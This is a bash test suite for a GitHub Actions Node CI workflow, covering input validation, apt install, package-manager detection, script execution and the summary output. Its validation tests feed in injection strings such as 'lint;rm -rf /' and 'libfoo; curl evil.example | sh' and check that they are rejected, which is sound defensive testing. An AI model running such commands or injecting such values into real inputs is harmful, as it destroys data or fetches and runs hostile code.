#!/usr/bin/env bash
# Runs the exact `run:` scripts of node-ci.yml (validate, apt, detect, require, scripts, summary)
# against the fixtures.
set -uo pipefail
root=$(cd "$(dirname "$0")/.." && pwd)
work=$(mktemp -d)
trap 'rm -rf "$work"' EXIT
# shellcheck source=lib/check.sh
. "$root/tests/lib/check.sh"
wf="$root/.github/workflows/node-ci.yml"
for step in validate apt detect require scripts summary; do
  python3 "$root/tests/lib/extract-step.py" "$wf" node-ci "$step" > "$work/$step.sh" || exit 1
done
python3 "$root/tests/lib/extract-step.py" "$wf" validate postgres > "$work/postgres.sh" || exit 1

# run_step <step> <dir> <workdir-label> [VAR=value...]: sets $out, $code, $outputs, $summary
run_step() {
  local step=$1 dir=$2 label=$3
  shift 3
  : > "$work/output"
  : > "$work/summary"
  out=$(cd "$dir" && env -i PATH="$PATH" HOME="$HOME" WORKDIR="$label" \
    GITHUB_OUTPUT="$work/output" GITHUB_STEP_SUMMARY="$work/summary" "$@" \
    bash "$work/$step.sh" 2>&1)
  code=$?
  outputs=$(cat "$work/output")
  summary=$(cat "$work/summary")
}

fx="$root/fixtures"

# --- validate ------------------------------------------------------------------------------
v() { run_step validate "$fx/node-npm" fixtures/node-npm SCRIPTS=lint,typecheck,test,build REQUIRE=lint,build AUDIT=none BUILD_ENV= APT_PACKAGES= "$@"; }
v
check "validate: defaults pass and emit both script lists" eval '[ $code = 0 ] && grep -qx "names=lint typecheck test build" <<< "$outputs" && grep -qx "require=lint build" <<< "$outputs"'
v SCRIPTS=" lint ,typecheck,, test,test ,build" "REQUIRE= lint , build ,"
check "validate: both lists are trimmed, empties dropped, duplicates kept once, order kept" eval '[ $code = 0 ] && grep -qx "names=lint typecheck test build" <<< "$outputs" && grep -qx "require=lint build" <<< "$outputs"'
v SCRIPTS="lint, test:coverage ,type-check,build.prod,"
check "validate: script names with ':' '.' '-' pass" eval '[ $code = 0 ] && grep -qx "names=lint test:coverage type-check build.prod" <<< "$outputs"'
v SCRIPTS='lint,te st'
check "validate: scripts rejects 'te st'" eval '[ $code = 1 ] && has "$out" "Input '"'"'scripts'"'"'"'
v SCRIPTS='lint;rm -rf /'
check "validate: scripts rejects 'lint;rm -rf /'" eval '[ $code = 1 ] && has "$out" "Input '"'"'scripts'"'"'"'
v REQUIRE='lint;rm -rf /'
check "validate: require rejects 'lint;rm -rf /'" eval '[ $code = 1 ] && has "$out" "Input '"'"'require'"'"'"'
v REQUIRE=
check "validate: empty require is an empty list" eval '[ $code = 0 ] && grep -qx "require=" <<< "$outputs"'
v AUDIT=hig
check "validate: audit rejects 'hig'" eval '[ $code = 1 ] && has "$out" "Input '"'"'audit'"'"'"'
v AUDIT=critical
check "validate: audit accepts 'critical'" eval '[ $code = 0 ]'
v WORKDIR=../outside
check "validate: working-directory rejects '../outside'" eval '[ $code = 1 ] && has "$out" "Input '"'"'working-directory'"'"'"'
v BUILD_ENV=$'A=1\nB=a=b c\n\nVITE_URL=https://x.example/?a=1&b=2\nNODE_OPTIONS=--max-old-space-size=4096'
check "validate: env values with '=' spaces and URLs pass" eval '[ $code = 0 ]'
v BUILD_ENV='NOEQUALS'
check "validate: env rejects a line without '='" eval '[ $code = 1 ] && has "$out" "Input '"'"'env'"'"'"'
v BUILD_ENV='1A=1'
check "validate: env rejects a key starting with a digit" eval '[ $code = 1 ] && has "$out" "Input '"'"'env'"'"'"'
v APT_PACKAGES='ffmpeg libgtk-3-dev g++ libc6:amd64'
check "validate: apt-packages accepts Debian names" eval '[ $code = 0 ]'
for bad in 'libfoo; curl evil.example | sh' 'ffmpeg  sox' ' ffmpeg' 'FFmpeg' '-o APT::x=1'; do
  v APT_PACKAGES="$bad"
  check "validate: apt-packages rejects '$bad'" eval '[ $code = 1 ] && has "$out" "::error::Input '"'"'apt-packages'"'"'"'
done

# --- validate job, postgres step: runs before the service image is pulled ---------------------
for good in 17 16.4 18rc1 18beta2; do
  run_step postgres "$fx/node-pg" fixtures/node-pg POSTGRES_VERSION="$good"
  check "postgres: accepts '$good' and emits its alpine image" eval '[ $code = 0 ] && grep -qx "image=postgres:$good-alpine" <<< "$outputs"'
done
for bad in latest 17-alpine '17; id' '17 -c x=1' ' 17' 17.1.2 'x/evil'; do
  run_step postgres "$fx/node-pg" fixtures/node-pg POSTGRES_VERSION="$bad"
  check "postgres: rejects '$bad' and emits no image" eval '[ $code = 1 ] && has "$out" "::error::Input '"'"'postgres-version'"'"'" && ! has "$outputs" image='
done

# --- apt (sudo stubbed: it records each call, one argument per line) ------------------------
mkdir -p "$work/bin"
cat > "$work/bin/sudo" <<'STUB'
#!/usr/bin/env bash
printf '%s\n' "$@" "--" >> "$APT_LOG"
STUB
chmod +x "$work/bin/sudo"
: > "$work/apt.log"
run_step apt "$fx/node-npm" fixtures/node-npm PATH="$work/bin:$PATH" APT_LOG="$work/apt.log" APT_PACKAGES="ffmpeg libc6:amd64"
apt_calls=$(cat "$work/apt.log")
check "apt: update, then each package passed as its own argument" eval '[ $code = 0 ] && [ "$apt_calls" = "$(printf "%s\n" apt-get update -- apt-get install -y --no-install-recommends ffmpeg libc6:amd64 --)" ]'

# --- detect --------------------------------------------------------------------------------
run_step detect "$fx/node-npm" fixtures/node-npm PNPM_VERSION=
check "detect npm" eval '[ $code = 0 ] && has "$outputs" "pm=npm" && has "$outputs" "lockfile=fixtures/node-npm/package-lock.json" && has "$outputs" "nvmrc="'

run_step detect "$fx/node-pnpm" fixtures/node-pnpm PNPM_VERSION=
check "detect pnpm via packageManager" eval '[ $code = 0 ] && has "$outputs" "pm=pnpm" && grep -qx "pnpm-version=" <<< "$outputs"'

run_step detect "$fx/node-pnpm" fixtures/node-pnpm PNPM_VERSION=9.0.0
check "packageManager wins over pnpm-version input" eval '[ $code = 0 ] && grep -qx "pnpm-version=" <<< "$outputs"'

cp -r "$fx/node-pnpm" "$work/nopm"
python3 -c 'import json,sys; p=sys.argv[1]; d=json.load(open(p)); d.pop("packageManager"); json.dump(d, open(p, "w"))' "$work/nopm/package.json"
run_step detect "$work/nopm" nopm PNPM_VERSION=
check "pnpm without packageManager nor input fails" eval '[ $code = 1 ] && has "$out" "no pnpm-version input was given"'

run_step detect "$work/nopm" nopm PNPM_VERSION=8.15.9
check "pnpm-version input used without packageManager" eval '[ $code = 0 ] && grep -qx "pnpm-version=8.15.9" <<< "$outputs"'

run_step detect "$fx/node-nolock" fixtures/node-nolock PNPM_VERSION=
check "no lockfile fails" eval '[ $code = 1 ] && has "$out" "No lockfile in '"'"'fixtures/node-nolock'"'"'"'

cp -r "$fx/node-npm" "$work/nvm"
echo 22 > "$work/nvm/.nvmrc"
run_step detect "$work/nvm" sub/app PNPM_VERSION=
check ".nvmrc is reported" eval '[ $code = 0 ] && grep -qx "nvmrc=sub/app/.nvmrc" <<< "$outputs"'

# --- require (on the list validate emitted) -----------------------------------------------
run_step require "$fx/node-npm" fixtures/node-npm "REQUIRE_NAMES=lint build"
check "require satisfied" eval '[ $code = 0 ]'

run_step require "$fx/node-missing-script" fixtures/node-missing-script "REQUIRE_NAMES=lint typecheck build"
check "missing required scripts listed" eval '[ $code = 1 ] && has "$out" "Required package.json scripts missing: lint typecheck"'

run_step require "$fx/node-missing-script" fixtures/node-missing-script "REQUIRE_NAMES="
check "empty require accepts anything" eval '[ $code = 0 ]'

run_step require "$fx/node-npm" fixtures/node-npm "REQUIRE_NAMES=constructor"
check "require: an Object.prototype key is not a script" eval '[ $code = 1 ] && has "$out" "missing: constructor"'

# --- scripts (real npm on copies of the fixtures) ------------------------------------------
cp -r "$fx/node-npm" "$work/npm"
cp -r "$fx/node-broken" "$work/broken"
cp -r "$fx/node-env" "$work/env"

run_step scripts "$work/npm" npm PM=npm "NAMES=lint typecheck test build" BUILD_ENV=
check "scripts: every script runs in order" eval '[ $code = 0 ] && grep -qx "results=lint=success typecheck=success test=success build=success" <<< "$outputs" && [ "$(grep -c "::group::npm run test" <<< "$out")" = 1 ]'

run_step scripts "$work/broken" broken PM=npm "NAMES=lint typecheck test build" BUILD_ENV=
check "scripts: first failure fails the step, the rest is skipped" eval '[ $code = 1 ] && has "$outputs" "test=failure build=skipped" && has "$out" "::error::Script '"'"'test'"'"' failed"'

run_step scripts "$work/env" env PM=npm "NAMES=lint type-check test" BUILD_ENV=$'UNUSED=a=b c\n\nFIXTURE_FLAG=1'
check "scripts: renamed script runs, absent script is reported not failed, env lines reach the script" eval '[ $code = 0 ] && grep -qx "results=lint=absent type-check=success test=success" <<< "$outputs"'

run_step scripts "$work/env" env PM=npm NAMES=test BUILD_ENV=
check "scripts: the env fixture fails without its variable" eval '[ $code = 1 ] && has "$outputs" "results=test=failure"'

run_step scripts "$work/npm" npm PM=npm "NAMES=lint toString" BUILD_ENV=
check "scripts: an Object.prototype key is absent, not run" eval '[ $code = 0 ] && grep -qx "results=lint=success toString=absent" <<< "$outputs"'

# DATABASE_URL: set only with postgres-version, before the caller's env lines.
mkdir -p "$work/pg"
cat > "$work/pg/package.json" <<'PKG'
{ "name": "pg-probe", "version": "1.0.0", "private": true,
  "scripts": { "probe": "node -e \"require('fs').writeFileSync('url.txt', process.env.DATABASE_URL ?? 'unset')\"" } }
PKG
run_step scripts "$work/pg" pg PM=npm NAMES=probe BUILD_ENV= POSTGRES_VERSION=17
check "scripts: postgres-version exports DATABASE_URL to the test database" eval '[ $code = 0 ] && [ "$(cat "$work/pg/url.txt")" = postgres://postgres@127.0.0.1:5432/test ]'
run_step scripts "$work/pg" pg PM=npm NAMES=probe BUILD_ENV= POSTGRES_VERSION=
check "scripts: without postgres-version DATABASE_URL stays unset, not empty" eval '[ $code = 0 ] && [ "$(cat "$work/pg/url.txt")" = unset ]'
run_step scripts "$work/pg" pg PM=npm NAMES=probe BUILD_ENV=DATABASE_URL=postgres://x@h/db POSTGRES_VERSION=17
check "scripts: a caller env line overrides DATABASE_URL" eval '[ $code = 0 ] && [ "$(cat "$work/pg/url.txt")" = postgres://x@h/db ]'

# --- summary -------------------------------------------------------------------------------
run_step summary "$fx/node-pnpm" fixtures/node-pnpm PM=pnpm "NAMES=lint typecheck test build" \
  "RESULTS=lint=success typecheck=absent test=failure build=skipped"
check "summary table" eval '[ $code = 0 ] && has "$summary" "| lint | ✅ passed |" && has "$summary" "| typecheck | ⚠️ absent |" && has "$summary" "| test | ❌ failed |" && has "$summary" "| build | ⏭️ not run |" && has "$summary" "Package manager: \`pnpm\`"'

run_step summary "$fx/node-nolock" fixtures/node-nolock PM= "NAMES=lint typecheck test build" "RESULTS="
check "summary when detection failed" eval '[ $code = 0 ] && has "$summary" "not detected" && has "$summary" "| lint | ⏭️ not run |" && has "$summary" "| build | ⏭️ not run |"'

run_step summary "$fx/node-nolock" fixtures/node-nolock PM= "NAMES=" "RESULTS="
check "summary when validation failed lists nothing" eval '[ $code = 0 ] && has "$summary" "| Script | Result |"'

report node-ci
